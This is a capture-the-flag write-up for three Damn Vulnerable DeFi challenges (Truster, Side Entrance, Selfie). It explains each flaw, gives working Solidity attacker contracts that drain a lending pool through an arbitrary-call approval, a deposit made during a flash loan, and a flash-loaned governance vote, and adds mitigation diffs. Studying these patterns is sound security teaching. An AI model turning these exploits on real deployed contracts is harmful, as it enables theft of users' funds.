# 3 - Truster

## **Problem:**
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

## **Solution:**
The flashloan function takes the target contract address as an input, which will be responsible for repaying the debt. The function directly calls target.functionCall(data) from the Address library of OpenZeppelin, without validating the type of contract at the target address.

We exploit this behavior by initiating a flashloan with a borrowed amount of 0 tokens. We pass the address of the token contract as the target and provide the function signature of the approve function as the data. This results in the TrusterLenderPool contract approving tokens to our contract.

With this approval in place, our contract is able to transfer the entire token balance from the pool to itself, effectively bypassing the intended security checks.

### **Code:**
```javascript
contract Attacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
        token.transferFrom(address(pool), recovery, 1_000_000e18);
    }        
}
```
## **Mitigation:**
Consider changing target parameter to be an interface that execute operations and than repay limiting the user from calling arbitrary contracts.

```diff
- function flashLoan(uint256 borrowAmount, address target, bytes calldata data) external {
+ function flashLoan(uint256 borrowAmount, IFlashLoanBorrower target, bytes calldata data) external {
```


<br><br>

# 4 - Side Entrance

## **Problem:**

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

## **Solution:**
The pool is designed to allow `deposit`, `withdraw`, and `flashLoan` functions. The `flashLoan` function checks that the borrower has repayed by comparing contract's balance before and after the loan.
The problem is that the IFlashLoanEtherReceiver we pass can repay correctly by sending eth to the contract but it can also send them by using the `deposit` function incrementing our balance using borrowed funds.
We can then withdraw all the funds from the pool and send them to the recovery account.

### **Code:**
```javascript
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(1000e18);

        // after attack withdraw all ETH from pool
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, 1000e18);
    }

    function execute() external payable override {
        pool.deposit{value: 1000e18}();
    }

    receive() external payable {
    }
}
```

## **Mitigation:**
Consider using a lock mechanism to prevent user to call deposit during a flashloan.

```diff
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
+   lockdeposit = true;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    ...

+   lockdeposit = false;
}
```
<br>

```diff
    function deposit() external payable {
+       require(!lockdeposit, "Deposit not allowed during flashloan");
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }
```


# 5 - Selfie
## **Problem:**
A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

## **Solution:**
The pool allows users to borrow DVT tokens and then repay them. The pool also as an emergency withdraw function that can be called by the governance contract. The governance contract is a simple ERC20Votes contract that allows users to vote on proposals if they have 50%+1 of the total supply.
The DVT token is the one used for governance (ERC20Votes). 
The problem is that anyone could flashloan all the govenance tokens, delegate themself and propose a new action to start the emergency withdraw function.

Steps:
1. Flashloan all the DVT Vote tokens from the pool.
2. Now that the attacker has the majority of the votes, delegate himself and propose a new action to call the emergency withdraw function.
3. Repay the flashloan.
4. Waiting the action delay to execute the action.
5. Execute the action to withdraw all the funds from the pool.


### **Code:**
Attacker contract's `attack` function:
```javascript
function attack() external returns (uint256) {
    SelfiePool(pool).flashLoan(
        this,
        address(governanceToken),
        SelfiePool(pool).maxFlashLoan(address(governanceToken)),
        ""
    );     
    return actionId;    
}

function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data) external override returns (bytes32) {
    Votes(token).delegate(address(this));
    // Add a governance action to queue that calls emergencyExit on the pool
    actionId = ISimpleGovernance(governance).queueAction(
        pool,
        0,
        abi.encodeWithSignature("emergencyExit(address)", recovery)
    );

    // Approve to repay the loan
    IERC20(token).approve(pool, amount + fee);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

Player executing the attack and waiting for the action delay to execute the action:
```javascript
Attacker attacker = new Attacker(address(pool), recovery, address(governance), token);
uint256 actionId = attacker.attack();
// Execute the queued action after the delay
vm.warp(block.timestamp + ISimpleGovernance(governance).getActionDelay());
ISimpleGovernance(governance).executeAction(actionId);
```

## **Mitigation:**
Consider not using the same token for governance and for the pool.
Governance token should not be counted for borrowed tokens.